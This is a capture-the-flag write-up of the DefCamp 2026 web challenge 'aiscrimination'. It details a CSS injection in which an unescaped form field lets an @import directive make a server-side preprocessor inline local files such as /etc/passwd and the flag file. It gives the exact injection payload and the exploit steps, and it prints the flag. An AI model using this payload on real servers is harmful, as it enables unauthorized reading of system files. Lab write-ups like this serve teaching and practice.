# DefCamp CTF 2026: aiscrimination (Web) - Writeup

## Challenge Overview
- **Category:** Web
- **Points:** 355
- **Type:** deployment / kubernetes
- **Difficulty:** Medium
- **Description:** "I want to be included." Format: `CTF{sha256}`

## Background & Architecture
The target is a Python/Flask web application running on Gunicorn. It presents the "AIscrimination" community feed for "humans unfairly judged by classifiers".

Users can submit an "Application for Existence" at `/join`:
- Parameters: `display_name`, `comment`, `statement`
- The application issues an "Inclusion Card" at `/people/<profile_id>`
- Each card links to a dynamic stylesheet at `/assets/cards/<profile_id>/identity.css`
- A hint on the profile page notes: *"Your card has been published. It was compiled from locally imported design fragments."*
- An editorial article at `/posts/reused-component` provides key architectural clues:
  - *"The Brand Team Reused a Component"*
  - *"Good news: inclusion cards no longer copy style fragments by hand. Bad news: someone described the path rules as 'intuitive.'"*
  - Comment from Tired SRE: *"If the renderer can find it, the renderer will include it. I hate that sentence."*

## Vulnerability Analysis

### 1. Server-Side CSS Compilation
When a card is published, its `identity.css` is generated server-side using a CSS preprocessor. Inspection of generated CSS reveals:
```css
/* AIscrimination identity-card stylesheet */
.identity-card::after {
  content: "<USER_STATEMENT>";
  display: block;
  color: #d9d4ff;
  font-size: .93rem;
  line-height: 1.45;
  margin-top: .65rem;
}
```

### 2. CSS Injection & Arbitrary Local File Read via `@import url(...)`
The `statement` parameter is embedded without string escaping or input sanitization. This allows closing the CSS string literal and declaration block:
```css
x"; } @import url("/path/to/file"); .x { content: "
```
Because the CSS is compiled server-side, the CSS preprocessor resolves `@import url(...)` directives locally on the server filesystem. When pointing to a local file, the preprocessor embeds the file's text directly into the compiled CSS output rule for `#card-<profile_id> .imported-fragment::after`:
```css
#card-486b35b00c1c4dad929a3ee60db005e7 .imported-fragment::after {
  content: "root:x:0:0:root:/root:/bin/bash\A daemon:x:1:1:daemon...ctf:x:1000:1000::/home/ctf:/bin/sh\A ";
  display: inline-block;
  ...
}
```

Testing `/etc/passwd` confirmed arbitrary file read access as user `ctf` (uid 1000).

## Exploit Execution
1. Send `POST /join` with a crafted `statement` requesting `/home/ctf/flag.txt`:
   ```text
   x"; } @import url("/home/ctf/flag.txt"); .x { content: "
   ```
2. Retrieve the assigned `profile_id` from the decoded session cookie.
3. Fetch `GET /assets/cards/<profile_id>/identity.css`.
4. Parse the verbatim flag from the `.imported-fragment::after { content: "..."; }` CSS block.

## Flag
`CTF{5bb9cb8b8ff43e243fe85fceaf646e7ba6a5c80250e96678be2aa71add38eb97}`
